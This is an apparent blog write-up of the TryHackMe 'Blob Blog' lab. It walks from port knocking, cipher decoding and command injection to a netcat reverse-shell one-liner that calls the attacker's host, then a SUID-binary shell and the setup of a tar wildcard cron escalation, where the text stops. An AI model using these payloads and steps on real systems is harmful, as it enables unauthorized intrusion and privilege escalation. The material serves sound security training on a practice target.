---
title: "The Blob Blog TryHackMe Write Up"
last_modified_at: 2020-11-20T10:40:02-05:00
categories:
  - thm
author_profile: false
tags:
  - thm
  - linux
  - vigenere cipher
  - FTP
  - GDB
  - Ghidra
  - privilege escalation
  - Port Knocking
  - tar wildcard privesc
  - Reverse Engineering
  - theblobblog
---

<img alt="theblobblog" src="/assets/images/thm/theblobblog/theblobblog.png" width="200px" height="50px">

<script data-name="BMC-Widget" src="https://cdnjs.buymeacoffee.com/1.0.0/widget.prod.min.js" data-id="reddevil2020" data-description="Support me on Buy me a coffee!" data-message="Thank you for visiting. You can now buy me a coffee!" data-color="#FFDD00" data-position="Right" data-x_margin="18" data-y_margin="18"></script>

[The Blob Blog](https://tryhackme.com/room/theblobblog) is a medium rated room in TryHackMe by  [bobloblaw](https://tryhackme.com/p/bobloblaw). It involves port knocking, decoding of different encrypted ciphers, command injection, binary reversing with ghidra, dynamic analysis of binary with gdb and using tar wildcard for privilege escalation.

# Port Scan
### All Port Scan
```console
local@local:~/Documents/tryhackme/the_blob_blog$ nmap -p- --min-rate 10000 -oN initial -v 10.10.28.44
Nmap scan report for 10.10.28.44
Host is up (0.39s latency).
Not shown: 65533 filtered ports
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
```
We only have two ports open.

# HTTP Service on Port 80
![1](/assets/images/thm/theblobblog/1.png)

Checking the source of the page
```html
<!--
K1stLS0+Kys8XT4rLisrK1stPisrKys8XT4uLS0tLisrKysrKysrKy4tWy0+KysrKys8XT4tLisrKytbLT4rKzxdPisuLVstPisrKys8XT4uLS1bLT4rKysrPF0+LS4tWy0+KysrPF0+LS4tLVstLS0+KzxdPi0tLitbLS0tLT4rPF0+KysrLlstPisrKzxdPisuLVstPisrKzxdPi4tWy0tLT4rKzxdPisuLS0uLS0tLS0uWy0+KysrPF0+Li0tLS0tLS0tLS0tLS4rWy0tLS0tPis8XT4uLS1bLS0tPis8XT4uLVstLS0tPis8XT4rKy4rK1stPisrKzxdPi4rKysrKysrKysrKysuLS0tLS0tLS0tLi0tLS0uKysrKysrKysrLi0tLS0tLS0tLS0uLS1bLS0tPis8XT4tLS0uK1stLS0tPis8XT4rKysuWy0+KysrPF0+Ky4rKysrKysrKysrKysrLi0tLS0tLS0tLS0uLVstLS0+KzxdPi0uKysrK1stPisrPF0+Ky4tWy0+KysrKzxdPi4tLVstPisrKys8XT4tLi0tLS0tLS0tLisrKysrKy4tLS0tLS0tLS0uLS0tLS0tLS0uLVstLS0+KzxdPi0uWy0+KysrPF0+Ky4rKysrKysrKysrKy4rKysrKysrKysrKy4tWy0+KysrPF0+LS4rWy0tLT4rPF0+KysrLi0tLS0tLS4rWy0tLS0+KzxdPisrKy4tWy0tLT4rKzxdPisuKysrLisuLS0tLS0tLS0tLS0tLisrKysrKysrLi1bKys+LS0tPF0+Ky4rKysrK1stPisrKzxdPi4tLi1bLT4rKysrKzxdPi0uKytbLS0+KysrPF0+LlstLS0+Kys8XT4tLS4rKysrK1stPisrKzxdPi4tLS0tLS0tLS0uWy0tLT4rPF0+LS0uKysrKytbLT4rKys8XT4uKysrKysrLi0tLS5bLS0+KysrKys8XT4rKysuK1stLS0tLT4rPF0+Ky4tLS0tLS0tLS0uKysrKy4tLS4rLi0tLS0tLS4rKysrKysrKysrKysrLisrKy4rLitbLS0tLT4rPF0+KysrLitbLT4rKys8XT4rLisrKysrKysrKysrLi4rKysuKy4rWysrPi0tLTxdPi4rK1stLS0+Kys8XT4uLlstPisrPF0+Ky5bLS0tPis8XT4rLisrKysrKysrKysrLi1bLT4rKys8XT4tLitbLS0tPis8XT4rKysuLS0tLS0tLitbLS0tLT4rPF0+KysrLi1bLS0tPisrPF0+LS0uKysrKysrKy4rKysrKysuLS0uKysrK1stPisrKzxdPi5bLS0tPis8XT4tLS0tLitbLS0tLT4rPF0+KysrLlstLT4rKys8XT4rLi0tLS0tLi0tLS0tLS0tLS0tLS4tLS1bLT4rKysrPF0+Li0tLS0tLS0tLS0tLS4tLS0uKysrKysrKysrLi1bLT4rKysrKzxdPi0uKytbLS0+KysrPF0+Li0tLS0tLS0uLS0tLS0tLS0tLS0tLi0tLVstPisrKys8XT4uLS0tLS0tLS0tLS0tLi0tLS4rKysrKysrKysuLVstPisrKysrPF0+LS4tLS0tLVstPisrPF0+LS4tLVstLS0+Kys8XT4tLg==
-->

<!--
Dang it Bob, why do you always forget your password?
I'll encode for you here so nobody else can figure out what it is: 
HcfP8J54AK4
-->
```
Here we have a something which looks like base64 encoded string which can be identified by the trailing **==** and the other one has a encoded credentials for user bob.

### Base58 Decoding

The string **HcfP8J54AK4** is a base58 decoded string. So, I decoded it using [cyberchef](https://gchq.github.io/CyberChef/)
![4](/assets/images/thm/theblobblog/4.png)

I am using a random password as the rule in THM says to hide the sensitive information.
```
Bob : <base58-decoded-password>
```
### Base64 Decoding
```console
local@local:~/Documents/tryhackme/the_blob_blog$ echo 'K1stLS0+Kys8XT4rLisrK1stPisrKys8XT4uLS0tLisrKysrKysrKy4tWy0+KysrKys8XT4tLisrKytbLT4rKzxdPisuLVstPisrKys8XT4uLS1bLT4rKysrPF0+LS4tWy0+KysrPF0+LS4tLVstLS0+KzxdPi0tLitbLS0tLT4rPF0+KysrLlstPisrKzxdPisuLVstPisrKzxdPi4tWy0tLT4rKzxdPisuLS0uLS0tLS0uWy0+KysrPF0+Li0tLS0tLS0tLS0tLS4rWy0tLS0tPis8XT4uLS1bLS0tPis8XT4uLVstLS0tPis8XT4rKy4rK1stPisrKzxdPi4rKysrKysrKysrKysuLS0tLS0tLS0tLi0tLS0uKysrKysrKysrLi0tLS0tLS0tLS0uLS1bLS0tPis8XT4tLS0uK1stLS0tPis8XT4rKysuWy0+KysrPF0+Ky4rKysrKysrKysrKysrLi0tLS0tLS0tLS0uLVstLS0+KzxdPi0uKysrK1stPisrPF0+Ky4tWy0+KysrKzxdPi4tLVstPisrKys8XT4tLi0tLS0tLS0tLisrKysrKy4tLS0tLS0tLS0uLS0tLS0tLS0uLVstLS0+KzxdPi0uWy0+KysrPF0+Ky4rKysrKysrKysrKy4rKysrKysrKysrKy4tWy0+KysrPF0+LS4rWy0tLT4rPF0+KysrLi0tLS0tLS4rWy0tLS0+KzxdPisrKy4tWy0tLT4rKzxdPisuKysrLisuLS0tLS0tLS0tLS0tLisrKysrKysrLi1bKys+LS0tPF0+Ky4rKysrK1stPisrKzxdPi4tLi1bLT4rKysrKzxdPi0uKytbLS0+KysrPF0+LlstLS0+Kys8XT4tLS4rKysrK1stPisrKzxdPi4tLS0tLS0tLS0uWy0tLT4rPF0+LS0uKysrKytbLT4rKys8XT4uKysrKysrLi0tLS5bLS0+KysrKys8XT4rKysuK1stLS0tLT4rPF0+Ky4tLS0tLS0tLS0uKysrKy4tLS4rLi0tLS0tLS4rKysrKysrKysrKysrLisrKy4rLitbLS0tLT4rPF0+KysrLitbLT4rKys8XT4rLisrKysrKysrKysrLi4rKysuKy4rWysrPi0tLTxdPi4rK1stLS0+Kys8XT4uLlstPisrPF0+Ky5bLS0tPis8XT4rLisrKysrKysrKysrLi1bLT4rKys8XT4tLitbLS0tPis8XT4rKysuLS0tLS0tLitbLS0tLT4rPF0+KysrLi1bLS0tPisrPF0+LS0uKysrKysrKy4rKysrKysuLS0uKysrK1stPisrKzxdPi5bLS0tPis8XT4tLS0tLitbLS0tLT4rPF0+KysrLlstLT4rKys8XT4rLi0tLS0tLi0tLS0tLS0tLS0tLS4tLS1bLT4rKysrPF0+Li0tLS0tLS0tLS0tLS4tLS0uKysrKysrKysrLi1bLT4rKysrKzxdPi0uKytbLS0+KysrPF0+Li0tLS0tLS0uLS0tLS0tLS0tLS0tLi0tLVstPisrKys8XT4uLS0tLS0tLS0tLS0tLi0tLS4rKysrKysrKysuLVstPisrKysrPF0+LS4tLS0tLVstPisrPF0+LS4tLVstLS0+Kys8XT4tLg==' | base64 -d
+[--->++<]>+.+++[->++++<]>.---.+++++++++.-[->+++++<]>-.++++[->++<]>+.-[->++++<]>.--[->++++<]>-.-[->+++<]>-.--[--->+<]>--.+[---->+<]>+++.[->+++<]>+.-[->+++<]>.-[--->++<]>+.--.-----.[->+++<]>.------------.+[----->+<]>.--[--->+<]>.-[---->+<]>++.++[->+++<]>.++++++++++++.---------.----.+++++++++.----------.--[--->+<]>---.+[---->+<]>+++.[->+++<]>+.+++++++++++++.----------.-[--->+<]>-.++++[->++<]>+.-[->++++<]>.--[->++++<]>-.--------.++++++.---------.--------.-[--->+<]>-.[->+++<]>+.+++++++++++.+++++++++++.-[->+++<]>-.+[--->+<]>+++.------.+[---->+<]>+++.-[--->++<]>+.+++.+.------------.++++++++.-[++>---<]>+.+++++[->+++<]>.-.-[->+++++<]>-.++[-->+++<]>.[--->++<]>--.+++++[->+++<]>.---------.[--->+<]>--.+++++[->+++<]>.++++++.---.[-->+++++<]>+++.+[----->+<]>+.---------.++++.--.+.------.+++++++++++++.+++.+.+[---->+<]>+++.+[->+++<]>+.+++++++++++..+++.+.+[++>---<]>.++[--->++<]>..[->++<]>+.[--->+<]>+.+++++++++++.-[->+++<]>-.+[--->+<]>+++.------.+[---->+<]>+++.-[--->++<]>--.+++++++.++++++.--.++++[->+++<]>.[--->+<]>----.+[---->+<]>+++.[-->+++<]>+.-----.------------.---[->++++<]>.------------.---.+++++++++.-[->+++++<]>-.++[-->+++<]>.-------.------------.---[->++++<]>.------------.---.+++++++++.-[->+++++<]>-.-----[->++<]>-.--[--->++<]>-.
```
After decoding, we get a different kind of cipher which I know to be a brainf**k language.

## Decoding Brainf**K on [dcode](https://www.dcode.fr/brainfuck-language)
![2](/assets/images/thm/theblobblog/2.png)

### Decoded Content
```
When I was a kid, my friends and I would always knock on 3 of our neighbors doors.  Always houses 1, then 3, then 5!
```
This has a hint related to port knocking sequence. With port knocking if we make a request with specific port sequence, then the firewall rule will be run on the server which might be configured to open few other ports.

## Port Knocking
I used telnet for the port knocking.We can also use nmap for the port knocking.
```console
local@local:~/Documents/tryhackme/the_blob_blog$ telnet 10.10.66.148 1
Trying 10.10.66.148...
telnet: Unable to connect to remote host: Connection refused
local@local:~/Documents/tryhackme/the_blob_blog$ telnet 10.10.66.148 3
Trying 10.10.66.148...
telnet: Unable to connect to remote host: Connection refused
local@local:~/Documents/tryhackme/the_blob_blog$ telnet 10.10.66.148 5
Trying 10.10.66.148...
telnet: Unable to connect to remote host: Connection refused
```

## Looking at the wireshark
![3](/assets/images/thm/theblobblog/3.png)

# Network Scan for all Ports
```console
local@local:~/Documents/tryhackme/the_blob_blog$ nmap -p- --min-rate 10000 10.10.66.148 -v
Starting Nmap 7.80 ( https://nmap.org ) at 2020-11-20 10:06 +0545
Nmap scan report for 10.10.66.148
Host is up (0.36s latency).
Not shown: 65529 closed ports
PORT     STATE    SERVICE
21/tcp   open     ftp
22/tcp   open     ssh
80/tcp   open     http
445/tcp  open     microsoft-ds
5355/tcp filtered llmnr
8080/tcp open     http-proxy

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 33.40 seconds
```
And this time, few other ports are open.

### Detail Scan
```console
local@local:~/Documents/tryhackme/the_blob_blog$ cat nmap/detail 
# Nmap 7.80 scan initiated Thu Nov 19 15:53:28 2020 as: nmap -p21,22,80,445,8080 -A -oN nmap/detail -v 10.10.126.66
Nmap scan report for 10.10.126.66
Host is up (0.39s latency).

PORT     STATE SERVICE VERSION
21/tcp   open  ftp     vsftpd 3.0.2
22/tcp   open  ssh     OpenSSH 6.6.1p1 Ubuntu 2ubuntu2.13 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   1024 e7:28:a6:33:66:4e:99:9e:8e:ad:2f:1b:49:ec:3e:e8 (DSA)
|   2048 86:fc:ed:ce:46:63:4d:fd:ca:74:b6:50:46:ac:33:0f (RSA)
|   256 e0:cc:05:0a:1b:8f:5e:a8:83:7d:c3:d2:b3:cf:91:ca (ECDSA)
|_  256 80:e3:45:b2:55:e2:11:31:ef:b1:fe:39:a8:90:65:c5 (ED25519)
80/tcp   open  http    Apache httpd 2.4.7 ((Ubuntu))
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.7 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
445/tcp  open  http    Apache httpd 2.4.7 ((Ubuntu))
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.7 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
8080/tcp open  http    Werkzeug httpd 1.0.1 (Python 3.5.3)
| http-methods: 
|_  Supported Methods: GET HEAD OPTIONS
|_http-title: Apache2 Ubuntu Default Page: It works
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
|_smb2-time: Protocol negotiation failed (SMB2)

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Thu Nov 19 15:54:50 2020 -- 1 IP address (1 host up) scanned in 82.36 seconds
```
Here on port 445 and 8080, HTTP service is running and FTP is running on port 21.

# Port 21
```console
local@local:~/Documents/tryhackme/the_blob_blog$ ftp 10.10.66.148                                                                                                
Connected to 10.10.66.148.
220 (vsFTPd 3.0.2)
Name (10.10.66.148:local): bob
331 Please specify the password.
Password:
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> dir -a
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
dr-xr-xr-x    3 1001     1001         4096 Jul 25 13:08 .
dr-xr-xr-x    3 1001     1001         4096 Jul 25 13:08 ..
-rw-r--r--    1 1001     1001          220 Jul 25 13:07 .bash_logout
-rw-r--r--    1 1001     1001         3771 Jul 25 13:07 .bashrc
-rw-r--r--    1 1001     1001          675 Jul 25 13:07 .profile
-rw-r--r--    1 1001     1001         8980 Jul 25 13:07 examples.desktop
dr-xr-xr-x    3 65534    65534        4096 Jul 25 13:08 ftp
226 Directory send OK.
ftp> cd ftp
250 Directory successfully changed.
ftp> dir -a
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
dr-xr-xr-x    3 65534    65534        4096 Jul 25 13:08 .
dr-xr-xr-x    3 1001     1001         4096 Jul 25 13:08 ..
drwxr-xr-x    2 1001     1001         4096 Jul 28 15:05 files
226 Directory send OK.
ftp> cd files
250 Directory successfully changed.
ftp> dir -a
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
drwxr-xr-x    2 1001     1001         4096 Jul 28 15:05 .
dr-xr-xr-x    3 65534    65534        4096 Jul 25 13:08 ..
-rw-r--r--    1 1001     1001         8183 Jul 28 15:05 cool.jpeg
226 Directory send OK.
ftp> get cool.jpeg
local: cool.jpeg remote: cool.jpeg
200 PORT command successful. Consider using PASV.
150 Opening BINARY mode data connection for cool.jpeg (8183 bytes).
226 Transfer complete.
8183 bytes received in 0.08 secs (102.0758 kB/s)
ftp> 
```
We successfully log in as bob and the decoded password and downloaded a file called cool.jpeg.

### Steghide to extract the content
```console
local@local:~/Documents/tryhackme/the_blob_blog$ steghide extract -sf cool.jpeg 
Enter passphrase: 
steghide: could not extract any data with that passphrase!
```
We can not extract anything with empty passpharse. But its good to always check using steghide for jpeg files. And there was not much information on the metadata too.

# HTTP Service on Port 445
![5](/assets/images/thm/theblobblog/5.png)
Another default page for Apache.
### Checking the source
```html
<!--
Bob, I swear to goodness, if you can't remember <steghide-password-redacted> 
It's not that hard
-->
```
We get another password. So, I thought this might be the password for extracting contents from the jpeg file.

### Steghide
```console
local@local:~/Documents/tryhackme/the_blob_blog$ steghide extract -sf cool.jpeg 
Enter passphrase: 
wrote extracted data to "out.txt".
```
And this time we get a file back.
### Content of out.txt
```console
local@local:~/Documents/tryhackme/the_blob_blog$ cat out.txt 
zcv:p1fd3v3amT@55n0pr
/bobs_safe_for_stuff
```
Here we get a link and something the looks like a username:password combination and looking at the cipher identifier online, this ciphertext might be encrypted using vigenere cipher.

### visiting /bobs_safe_for_stuff
```console
local@local:~/Documents/tryhackme/the_blob_blog$ curl http://10.10.66.148:445/bobs_safe_for_stuff
Remember this next time bob, you need it to get into the blog! I'm taking this down tomorrow, so write it down!
- <vigenere-cipher-key-redacted>
```
Looks like the username:password combination we found above is a username:password combination for bob and it is ciphered with the key \<vigenere-cipher-key-redacted\>

### Decoding the content
![6](/assets/images/thm/theblobblog/6.png)
And we get a password for bob.
```console
bob:<password-for-bob>
```

# Checking Port 8080
![7](/assets/images/thm/theblobblog/7.png)  
    
       
And yet another Apache default page on port 8080. But there was nothing on the source this time.

### Directory Bruteforce
```console
local@local:~/Documents/tryhackme/the_blob_blog$ gobuster dir -u http://10.10.66.148:8080/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x py,txt -t 50 -o gobuster/port8080.log
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://10.10.66.148:8080/
[+] Threads:        50
[+] Wordlist:       /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Extensions:     py,txt
[+] Timeout:        10s
===============================================================
2020/11/20 10:28:54 Starting gobuster
===============================================================
/blog (Status: 302)
/login (Status: 200)
/review (Status: 200)
/blog1 (Status: 200)
/blog2 (Status: 200)
/blog3 (Status: 200)
```

## Checking /login
![8](/assets/images/thm/theblobblog/8.png)
Lets login with the previous credentials for bob.
![9](/assets/images/thm/theblobblog/9.png)
And we login. Looking around the blog, we can view few blog posts, can submit the review and can see the last review that we submitted. So I started to play with the review if I can get command injection, so I tried payload like **;id**, **& id**, but they are reflected as it is. Then I tried if there is some sort of SQL injection and many things. At last just **id** did the trick.

### Command injection
![10](/assets/images/thm/theblobblog/10.png)
![11](/assets/images/thm/theblobblog/11.png)
Now that we have got code execution, lets try and get a reverse shell on the box.

# Shell as www-data
### Listening on our box
```console
local@local:~/Documents/tryhackme/the_blob_blog$ nc -nvlp 9001
Listening on 0.0.0.0 9001
```
### Reverse shell payload
```console
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.6.31.213 9001 >/tmp/f
```
### Submitting a review
![12](/assets/images/thm/theblobblog/12.png)
And while trying to check the submitted review, we get a shell back.
```console
local@local:~/Documents/tryhackme/the_blob_blog$ nc -nvlp 9001
Listening on 0.0.0.0 9001
Connection received on 10.10.66.148 42090
/bin/sh: 0: can't access tty; job control turned off
$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
$ 
```
Now this shell is a bit hard to work with as it is not interactive. It lacks using arrow keys, autocompletion, and using keys like CTRL+C to kill a process. So We have to make this session a interactive session.

## Getting a proper TTY
Now lets get a proper shell with auto completion.
```console
$ python3 -c "import pty;pty.spawn('/bin/bash')"
```
Hit CRTL+z to background the current process and on local box type
```console
local@local:~/Documents/tryhackme/the_blob_blog$ stty raw -echo
```
and type fg and hit enter twice and on the reverse shell export the TERM as xterm.
```console
www-data@bobloblaw-VirtualBox:~/html2$  export TERM=xterm
```
Now we have a proper shell.

# Privilege Escalation
### Users with shell
```console
www-data@bobloblaw-VirtualBox:~/html2$ cat /etc/passwd | grep -i bash
root:x:0:0:root:/root:/bin/bash
www-data:x:33:33:www-data:/var/www:/bin/bash
bobloblaw:x:1000:1000:bobloblaw,,,:/home/bobloblaw:/bin/bash
bob:x:1001:1001:,,,:/home/bob:/bin/bash
```

### Checking /etc/crontab
```console
www-data@bobloblaw-VirtualBox:~/html2$ cat /etc/crontab 
# /etc/crontab: system-wide crontab
# Unlike any other crontab you don't have to run the `crontab'
# command to install the new version when you edit this file
# and files in /etc/cron.d. These files also have username fields,
# that none of the other crontabs do.

SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

# m h dom mon dow user  command
17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
25 6    * * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
47 6    * * 7   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 6    1 * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
#

*  *    * * *   root    cd /home/bobloblaw/Desktop/.uh_oh && tar -zcf /tmp/backup.tar.gz *
```
There is a cron which is running as root and archiving all the files inside /home/bobloblaw/Desktop/.uh_oh and using wildcard which can be easily exploited to get a root shell on the box.
### Checking permissions on the folder /home/bobloblaw/Desktop/.uh_oh 
```console
www-data@bobloblaw-VirtualBox:~/html2$ ls -la /home/bobloblaw/Desktop/.uh_oh
ls: cannot access '/home/bobloblaw/Desktop/.uh_oh': Permission denied
```
The problem is we can not access that folder. If we have a way to acess that folder, we can get a root shell using tar wildcard vulnerability.

### Checking for SUID binaries
I ran lipeas first to check for all the SUID binaries, but as this is a hard box, I am not going to show the process here. Here I will search for the SUID binary owned by bobloblaw directly.

```console
www-data@bobloblaw-VirtualBox:~/html2$ find / -type f -user bobloblaw -perm -4000 -ls 2>/dev/null
      207     20 -rwsrwxr-x   1 bobloblaw bobloblaw    16768 Jul 25 22:56 /usr/bin/blogFeedback
```
There is a binary called blogFeedback, that is owned by user boblobaw. If we can find any misconfigration there, we can execute commands as user bobloblaw.
Lets download the file and analyse on ghidra. I downloaded the file by serving the directory /usr/bin using Python http.server.

## Reversing binary using ghidra
```c
undefined8 main(int var1,long var2)

{
  int chr;
  int tmp;
  
  if ((var1 < 7) || (7 < var1)) {
    puts("Order my blogs!");
  }
  else {
    tmp = 1;
    while (tmp < 7) {
      chr = atoi(*(char **)(var2 + (long)tmp * 8));
      if (chr != 7 - tmp) {
        puts("Hmm... I disagree!");
        return 0;
      }
      tmp = tmp + 1;
    }
    puts("Now that, I can get behind!");
    setreuid(1000,1000);
    system("/bin/sh");
  }
  return 0;
}

```
There are two checks being implemented. The first checks for the argument number and the second check checks the argument value. If we pass the both checks, we can get a shell as user bobloblaw.

### Bypassing first check
```
local@local:~/Documents/tryhackme/the_blob_blog$ ./blogFeedback 
Order my blogs!
local@local:~/Documents/tryhackme/the_blob_blog$ ./blogFeedback 1
Order my blogs!
local@local:~/Documents/tryhackme/the_blob_blog$ ./blogFeedback 1 2
Order my blogs!
local@local:~/Documents/tryhackme/the_blob_blog$ ./blogFeedback 1 2 3
Order my blogs!
local@local:~/Documents/tryhackme/the_blob_blog$ ./blogFeedback 1 2 3 4
Order my blogs!
local@local:~/Documents/tryhackme/the_blob_blog$ ./blogFeedback 1 2 3 4 5
Order my blogs!
local@local:~/Documents/tryhackme/the_blob_blog$ ./blogFeedback 1 2 3 4 5 6
Hmm... I disagree!
```
And with 6 arguments the first check is bypassed. For the second check, I used gdb for dynamic analysis.

### Using GDB for finding the argument value
```console
local@local:~/Documents/tryhackme/the_blob_blog$ gdb -q blogFeedback
Reading symbols from blogFeedback...                                                    
(No debugging symbols found in blogFeedback)                                            
(gdb) disassemble main                                                                  
Dump of assembler code for function main:                                               
   0x0000000000001165 <+0>:     push   rbp             
   0x0000000000001166 <+1>:     mov    rbp,rsp                                          
   0x0000000000001169 <+4>:     sub    rsp,0x20                                         
   0x000000000000116d <+8>:     mov    DWORD PTR [rbp-0x14],edi                         
   0x0000000000001170 <+11>:    mov    QWORD PTR [rbp-0x20],rsi                         
   0x0000000000001174 <+15>:    cmp    DWORD PTR [rbp-0x14],0x6                         
   0x0000000000001178 <+19>:    jle    0x1180 <main+27>                                 
   0x000000000000117a <+21>:    cmp    DWORD PTR [rbp-0x14],0x7
...........
...........
   0x00000000000011be <+89>:    call   0x1060 <atoi@plt>                   
   0x00000000000011c3 <+94>:    mov    edx,0x7                                          
   0x00000000000011c8 <+99>:    sub    edx,DWORD PTR [rbp-0x4]         
   0x00000000000011cb <+102>:   cmp    eax,edx   
   ..........
   ..........
   ```
   Here the comparison is done on **main+102**, so I set a break point on main+102 and I will check the value of the two registers eax and edx.

   ```console
(gdb) b *main+102
Breakpoint 1 at 0x11cb
(gdb) r 1 2 3 4 5 6
Starting program: /home/local/Documents/tryhackme/the_blob_blog/blogFeedback 1 2 3 4 5 6

Breakpoint 1, 0x00005555555551cb in main ()
(gdb)
```
I ran the program with 6 arguments and the breakpoint is hit. Lets check the register values.
```console
(gdb) info registers 
rax            0x1                 1
rbx            0x555555555230      93824992236080
rcx            0x0                 0
rdx            0x6                 6
rsi            0x1                 1
rdi            0x7fffffffe19d      140737488347549
rbp            0x7fffffffdca0      0x7fffffffdca0
rsp            0x7fffffffdc80      0x7fffffffdc80
r8             0x1999999999999999  1844674407370955161
r9             0x0                 0
r10            0x7ffff7f59ac0      140737353456320
r11            0x7ffff7f5a3c0      140737353458624
r12            0x555555555080      93824992235648
r13            0x7fffffffdd90      140737488346512
r14            0x0                 0
r15            0x0                 0
rip            0x5555555551cb      0x5555555551cb <main+102>
eflags         0x206               [ PF IF ]
cs             0x33                51
ss             0x2b                43
ds             0x0                 0
es             0x0                 0
fs             0x0                 0
gs             0x0                 0
(gdb) 
```
The value of rax is 0x01 and the value of register rdx is 0x06. So, we know the first value of the argument should be 6.
### Rerunning the binary as first argument as 6
```console
(gdb) r 6 2 3 4 5 6
Starting program: /home/local/Documents/tryhackme/the_blob_blog/blogFeedback 6 2 3 4 5 6

Breakpoint 1, 0x00005555555551cb in main ()
(gdb) c
Continuing.

Breakpoint 1, 0x00005555555551cb in main ()
(gdb) 
 ```
 This time we hit a breakpoint and I continued the program execution sequence and program execution stops at the breakpoint again which means we ran through the loop once which is a great sign.

### Checking the value of register
```console
(gdb) i r rax
rax            0x2                 2
(gdb) i r rdx
rdx            0x5                 5
(gdb) 
```
The value that we provided was 2 and the value that we should have provided to bypass the check is 5. So, we get the gist now. The aguments should be 6 5 4 3 2 and 1.

### Running with the obtained arguments
```console
www-data@bobloblaw-VirtualBox:~/html2$ /usr/bin/blogFeedback 6 5 4 3 2 1
Now that, I can get behind!
$ id
uid=1000(bobloblaw) gid=33(www-data) groups=33(www-data)
$ 
``` 
We get a shell as bobloblaw. COOL!!

## Reading user flag
```console
bobloblaw@bobloblaw-VirtualBox:/home/bobloblaw/Desktop$ cat user.txt 
THM{C0N*************fur}

@jakeyee thank you so so so much for the help with the foothold on the box!!
```
## Root Privilege Escalation
```console
bobloblaw@bobloblaw-VirtualBox:/home/bobloblaw/Desktop$ ls -la
total 40
drwxrwx---  3 bobloblaw bobloblaw  4096 Jul 28 15:08 .
drwxrwx--- 16 bobloblaw bobloblaw  4096 Aug  6 14:51 ..
-rw--w----  1 bobloblaw bobloblaw 11054 Jul 24 22:23 dontlookatthis.jpg
-rw--w----  1 bobloblaw bobloblaw 10646 Jul 24 22:29 lookatme.jpg
drwxrwx---  2 root      root       4096 Jul 28 14:18 .uh_oh
-rw--w----  1 bobloblaw bobloblaw   109 Jul 27 23:06 user.txt
bobloblaw@bobloblaw-VirtualBox:/home/bobloblaw/Desktop$ cd .uh_oh/
bash: cd: .uh_oh/: Permission denied
bobloblaw@bobloblaw-VirtualBox:/home/bob
```
The folder is owned by root and we dont have a permission to go inside the directory. But if we go a step back and check the whole parent directory, that is owned by us. 
```console
bobloblaw@bobloblaw-VirtualBox:/home/bobloblaw$ ls -la
total 132
drwxrwx--- 16 bobloblaw bobloblaw  4096 Aug  6 14:51 .
drwxr-xr-x  4 root      root       4096 Jul 25 14:07 ..
-rw-r--r--  1 bobloblaw bobloblaw   129 Jul 25 09:14 .apport-ignore.xml
lrwxrwxrwx  1 bobloblaw bobloblaw     9 Jul 29 22:16 .bash_history -> /dev/null
-rw-r--r--  1 bobloblaw bobloblaw   220 Jul 24 16:28 .bash_logout
-rw-r--r--  1 bobloblaw bobloblaw  3771 Jul 24 16:28 .bashrc
drwx------ 15 bobloblaw bobloblaw  4096 Jul 27 17:48 .cache
drwx------  3 bobloblaw bobloblaw  4096 Jul 24 16:44 .compiz
drwx------ 16 bobloblaw bobloblaw  4096 Jul 27 12:01 .config
drwxrwx---  3 bobloblaw bobloblaw  4096 Jul 28 15:08 Desktop
-rw-r--r--  1 bobloblaw bobloblaw    25 Jul 24 16:31 .dmrc
drwxr-xr-x  3 bobloblaw bobloblaw  4096 Jul 30 09:33 Documents
drwxr-xr-x  2 bobloblaw bobloblaw  4096 Jul 24 16:31 Downloads
-rw-r--r--  1 bobloblaw bobloblaw  8980 Jul 24 16:28 examples.desktop
-rw-------  1 bobloblaw bobloblaw 16456 Aug  6 14:33 .ICEauthority
drwxrwxr-x  3 bobloblaw bobloblaw  4096 Jul 24 16:31 .local
drwx------  5 bobloblaw bobloblaw  4096 Jul 26 11:18 .mozilla
drwxr-xr-x  2 bobloblaw bobloblaw  4096 Jul 24 16:31 Music
drwxr-xr-x  2 bobloblaw bobloblaw  4096 Jul 24 16:31 Pictures
-rw-r--r--  1 bobloblaw bobloblaw   675 Jul 24 16:28 .profile
drwxr-xr-x  2 bobloblaw bobloblaw  4096 Jul 24 16:31 Public
drwx------  2 bobloblaw bobloblaw  4096 Jul 28 15:20 .ssh
-rw-r--r--  1 bobloblaw bobloblaw     0 Jul 24 16:32 .sudo_as_admin_successful
drwxr-xr-x  2 bobloblaw bobloblaw  4096 Jul 24 16:31 Templates
drwxr-xr-x  2 bobloblaw bobloblaw  4096 Jul 24 16:31 Videos
-rw-------  1 bobloblaw bobloblaw    65 Aug  6 14:33 .Xauthority
-rw-------  1 bobloblaw bobloblaw  3225 Aug  6 14:33 .xsession-errors
-rw-------  1 bobloblaw bobloblaw  3225 Aug  6 14:06 .xsession-errors.old
```
So what we can do is move the whole parent directory and create another subdirectory called .uh_oh and then we can create files inside that.

```console
